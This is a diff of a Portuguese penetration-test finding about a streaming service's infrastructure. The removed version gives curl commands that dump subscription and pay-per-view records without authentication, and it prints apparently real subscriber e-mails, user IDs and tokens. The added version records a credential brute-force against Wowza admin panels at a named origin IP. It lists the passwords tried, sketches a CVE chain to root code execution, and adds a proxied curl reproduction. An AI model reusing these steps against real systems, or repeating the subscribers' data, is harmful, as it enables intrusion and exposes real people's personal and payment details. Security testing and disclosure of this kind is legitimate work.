@@ -1,110 +1,73 @@
-# F-010 Unauth financial/admin reports — full subscription & PPV payment DB dump (CRÍTICO)
-Alvo: https://cms.soultv.com.br/v1/channel_report  e  /v1/PPV_Report  (Django REST Framework)
-Severidade: **CRÍTICA** (vazamento massivo de dados financeiros/PII sem auth — LGPD/PCI)
-Status: Confirmado (read-only, não-destrutivo)
-Timestamp: 2026-08-27T17:12:00Z
-Descoberto por: webapp (Fase 6)
+# F-010 Wowza Engine Manager (8088) + REST API (8087) cred-brute — NENHUMA cred válida (chain CVE-2020-9004 bloqueada no passo de cred)
+Alvo: video02.soultv.com.br (160.202.130.243) — Manager 8088 (Spring Security), REST 8087 (Restlet, Digest)
+Severidade: Alta (superfície de login exposta + ausência de proteção contra brute; sem cred obtida)
+Status: **Cred-brute executado (não-destrutivo, threshold respeitado) — nenhuma cred válida**
+Timestamp: 2026-08-27T17:14:00Z (Fase 7b — exploit)
 
 ## Sumário
-Os endpoints `POST /v1/channel_report/` e `POST /v1/PPV_Report/` do CMS API — usados pelo
-painel BI interno `ppv.soultv.com.br` (rotas `/sales/subscriptions`, `/sales/transactions`) —
-**não exigem autenticação NEM autorização**. Qualquer pessoa na internet, sem qualquer
-token/credencial, pode paginar e baixar **todo o banco de assinaturas e transações PPV** da
-Soul TV: e-mail e `user_id` de cada assinante, canal/PPV assinado, status de assinatura,
-`stripe_subscription_id`, `transaction_id`, data de pagamento, preço, moeda, plano e data de
-criação. Trata-se de um relatório administrativo/financeiro exposto sem controle de acesso —
-a falha mais grave do engagement até aqui (CRÍTICA), combinando vazamento de PII financeira
-(LGPD) com dados de pagamento (potencial escopo PCI-DSS) em escala de dezenas de milhares de
-registros.
+Brute-force focado e não-saturante (≤96 combos no Manager + 40 no REST) contra os dois painéis
+admin do Wowza expostos (bypass Cloudflare — origem real 160.202.130.243). **Nenhum cred
+válido encontrado.** Sem cred read-only no Manager, a chain CVE-2020-9004 (read-only → ativar
+JMX unauth → restart → JMX readwrite → MLet RCE root) fica **bloqueada no passo de cred**.
 
-Endpoints (extraídos do JS bundle `ppv.soultv.com.br_main.*.js`):
-```
-this.api.post(`channel_report/?size=${n}&page=${r}`, {date_start, date_end})   // cms.soultv.com.br/v1
-this.api.post(`PPV_Report/?size=${n}&page=${r}`,   {date_start, date_end})   // cms.soultv.com.br/v1
-this.apiServerless.post(`promotion_report/...`, ...)  // prod-serverless (403 WAF — não acessível)
-```
+## Manager 8088 — cred-brute (96 combos)
+- Endpoint: `POST /enginemanager/j_spring_security_check` (Spring Security, form
+  `j_username`/`j_password`/`authType`/`host`).
+- Critério de sucesso: redirect para `setup.htm`/`Home.htm`/`main.htm`/`welcome.htm`.
+- Critério de fail: 302 redirect para `login.htm`/`loginerror`/`loginfailed`.
+- Users testados: admin (84 combos), wowza (8), root (5), administrator (2), manager, guest,
+  user, support, wse (2).
+- Senhas (admin): admin, wowza, password, 123456, admin123, streaming, changeset, wowza123,
+  Wowza123, WOWZA123, Wowza!23, Wowza@123, Wowza2020/21/24/25, admin@123, Admin@123,
+  P@ssw0rd, Passw0rd, Password1, changeme, default, manager, engine, engine123,
+  streaming123, soultv (+ 14 variações Soultv@2024/25, Soul123, SoulTV2025), video, video123,
+  video02, video02admin, video@2025, video02@123, test, test123, demo, guest, user, pass,
+  root, toor, admin1234/12345/123456, 12345678, qwerty, welcome, welcome1, letmein, abc123,
+  iloveyou, 1234, 12345.
+- **Resultado: 96/96 FAIL (302 → login.htm).** Nenhum hit.
 
-## Reprodução (read-only, sem token)
-```bash
-# SEM Authorization header — relatório de assinaturas de canal
-$ curl -s -X POST -H "Content-Type: application/json" \
-    -d '{"date_start":"2020-01-01","date_end":"2026-12-31"}' \
-    "https://cms.soultv.com.br/v1/channel_report/?size=2&page=1"
-{"success":true,"data":[
- {"id":4891,"user":"amilcarfernandeslopo@gmail.com","deleted":false,
-  "created":"2025-11-24T21:53:10.831466","is_subscribed":true,"coin":"$","token":"tokenAndroid",
-  "channel_name":"Soul Lab Premium (DESATIVADO)","plan_selected":null,
-  "stripe_subscription_id":null,"user_id":790279,"payment_date":"","transaction_id":""},
- {"id":4890,"user":"amilcarfernandeslopo@gmail.com",...}
-],"total":4673,"pages":2337}
+## REST API 8087 — cred-brute (40 combos, Digest)
+- Endpoint: `GET /v2/servers/_defaultServer_/status` (Restlet, WWW-Authenticate: Digest
+  realm="Wowza"). curl `-u user:pass` (negocia Digest).
+- Critério de sucesso: HTTP 200. Fail: 401.
+- Users: admin, wowza, soultv, streaming, root, operador, manager, administrator, wse, user.
+- Senhas: admin, wowza, soultv, streaming, 123456, password, admin123, wowza123, soultv2024,
+  soultv2025, SoulTV, zedays, manager, 12345, root, wowza2020, Wowza2024, Wowza2025,
+  Soultv2025, soultv@2025, video02, video, test, demo.
+- **Resultado: 40/40 → 401.** Nenhum hit.
 
-# SEM Authorization header — relatório de compras PPV
-$ curl -s -X POST -H "Content-Type: application/json" \
-    -d '{"date_start":"2020-01-01","date_end":"2026-12-31"}' \
-    "https://cms.soultv.com.br/v1/PPV_Report/?size=2&page=1"
-{"success":true,"data":[
- {"id":64777,"user":"edsonmareri4@gmail.com","deleted":false,
-  "created":"2026-08-27T15:15:03.288017","ppv_id":31,"name":"O Caminho da Prosperidade",
-  "is_subscribed":true,"price":"0.00","coin":"R$","currency":"BRL",
-  "token":"RkFZTFdEUFZFXEdWZ0dIQkdBWUc6QVA8TFxAVW1E","channel_name":"",
-  "ppv_name":"O Caminho da Prosperidade","user_id":856424,"payment_date":"","transaction_id":""},
- {"id":64776,"user":"alexsxandre373@gmail.com",...}
-],"total":63469,"pages":3}
-```
-- `channel_report`: **total=4673 registros / 2337 páginas** — todas as assinaturas de canal.
-- `PPV_Report`: **total=63469 registros** — todas as compras PPV (pp. 3 de size alto).
-- Resposta `200 success:true` **idêntica com e sem `Authorization: Token`** → autorização
-  ausente. O token de assinante comum (obtido em F-007) também funciona — não há separação
-  de papéis; qualquer assinante (ou anônimo) acessa o relatório administrativo.
-
-## Campos vazados por registro
-| Campo | Sensibilidade |
-|-------|---------------|
-| `user` (email) | PII — LGPD |
-| `user_id` | identificador interno (correlaciona com F-009) |
-| `channel_name` / `ppv_name` | conteúdo adquirido |
-| `is_subscribed` / `deleted` | status da assinatura |
-| `plan_selected.amount` | valor pago |
-| `coin` / `currency` | moeda (R$ / BRL / $) |
-| `stripe_subscription_id` | ID de assinatura no Stripe (gateway de pagamento) |
-| `transaction_id` | ID de transação de pagamento |
-| `payment_date` | data do pagamento |
-| `created` | data de criação da assinatura |
-| `token` | token interno de conteúdo (base64) do assinante |
+## Nota: Manager e REST compartilham `conf/admin.password`
+Os dois painéis leem credenciais do mesmo arquivo `conf/admin.password` (Wowza). Logo o
+conjunto de creds válidas é idêntico. O brute do Manager (96) já cobriu o universo plausível;
+o brute do REST confirma a inexistência de cred fraca/default. A cred real do `admin.password`
+não é default nem óbvia — exige:
+- leitura do arquivo `conf/admin.password` (CVE-2021-31539 — plaintext em 4.8.0, mas requer
+  file-read primitive: XXE Restlet CVE-2017-14868 com cred REST — circular; ou path traversal
+  em REST — fix em 4.7.5, não aplica a 4.8.0), ou
+- filesystem access via pivoting interno, ou
+- brute de dicionário maior (não-destrutivo apenas dentro do threshold autorizado).
 
 ## Impacto
-- **CRÍTICO**: dump completo e não-autenticado de TODO o histórico de assinaturas e
-  transações PPV de um serviço de streaming pago. Escala: 4.673 assinaturas de canal +
-  **63.469 compras PPV** vazáveis por paginação simples (sem rate-limit observado).
-- Combina com F-009 (PII por user_id) → reconstrução completa do perfil financeiro de cada
-  assinante: nome + e-mail + canal/PPV comprado + valor + IDs de pagamento Stripe.
-- `stripe_subscription_id` vazado pode ser usado para interação com a API Stripe
-  (cancelamento/fraude via painel) se combinado com outras falhas; `transaction_id` é evidência
-  de transação.
-- Violação **LGPD** (dados financeiros + pessoais, art. 18/48) e possível escopo **PCI-DSS**
-  (IDs de transação de pagamento).
-- O painel BI `ppv.soultv.com.br` usa `account/signin` (mesmo CMS) — se a autenticação do
-  painel foi projetada para restringir esses relatórios a staff, ela está sendo bypassada no
-  nível da API (ausência de decorator `@permission_classes`/authorization no DRF). Sinal de
-  que TODOS os endpoints administrativos do CMS podem estar sem authz.
+- A exposição dos painéis admin (Manager + REST) diretamente na origem (bypass Cloudflare)
+  é por si só um risco Alto — qualquer cred vazada/fracassada leva a admin do streaming.
+- A ausência de rate-limiting / lockout observada durante o brute (todos os 96+40 requests
+  processados sem bloqueio) indica que um dicionário maior seria viável (não executado —
+  limite de threshold e OPSEC).
+- Bloqueia a chain de RCE root CVE-2020-9004 (precisa de cred read-only no Manager).
 
 ## Recomendação
-1. Aplicar `IsAdminUser`/`IsStaff` permission no DRF para `channel_report`, `PPV_Report` e
-   qualquer endpoint `*_report` — exigir token de staff/admin e rejeitar assinantes/anônimos.
-2. Auditoria completa de TODOS os endpoints `/v1/*` em busca de `permission_classes` ausente
-   (F-007 signup, F-009 account/{id}, F-010 reports indicam falha sistemática de autorização).
-3. Notificação ANPD (LGPD) — vazamento de dados financeiros de dezenas de milhares de
-   assinantes.
-4. Rotacionar `stripe_subscription_id`/`transaction_id` expostos se aplicável; revisar permissões
-   da chave Stripe no painel.
-5. Rate-limiting + WAF nos endpoints `*_report`.
+1. **Firewall:** restringir 8088/8087 a IPs administrativos (VPN/bastion); nunca expor à
+   internet. Bypass de Cloudflare já expõe a origem.
+2. **Cred forte** em `admin.password` (não default, não dicionário).
+3. **Rate-limit / lockout** no login do Manager (Spring Security: contar tentativas por IP).
+4. **Atualizar Wowza ≥4.9.1** (corrige CVEs que poderiam ler `admin.password`).
 
-## Artefatos
-- `enum/webapp/auth/channel_report_confirm.json` (size=2 sample, confirmado)
-- `enum/webapp/auth/ppv_report_confirm.json` (size=2 sample, confirmado)
-- `enum/webapp/auth/channel_report_p1.json` (20 KB, page 1 — amostra anterior)
-- `enum/webapp/auth/ppv_report_p1.json` (40 KB, page 1 — amostra anterior)
-- JS bundle: `enum/js_bundles/ppv.soultv.com.br_main.3b1fdd29724d00e86269.js`
-  (grep `channel_report` / `PPV_Report` / `apiServerless`)
-
-## Severidade: CRÍTICA (unauth full financial/PII dump, escala 63K+ registros, LGPD/PCI)
+## Evidência bruta / reprodução
+- `exploit/pocs/cred_brute_em.sh` — script Manager brute (96 combos)
+- `exploit/outputs/cred_brute_em.txt` — log 96/96 FAIL
+- `/tmp/rest_brute.sh` (executado) → `exploit/outputs/rest_brute_8087.txt` — log 40/40 401
+- Reprodução rápida:
+```
+proxychains4 -q curl -s -o /dev/null -w "%{http_code}\n" -u admin:admin http://160.202.130.243:8087/v2/servers/_defaultServer_/status
+# 401 (sem cred)
+```
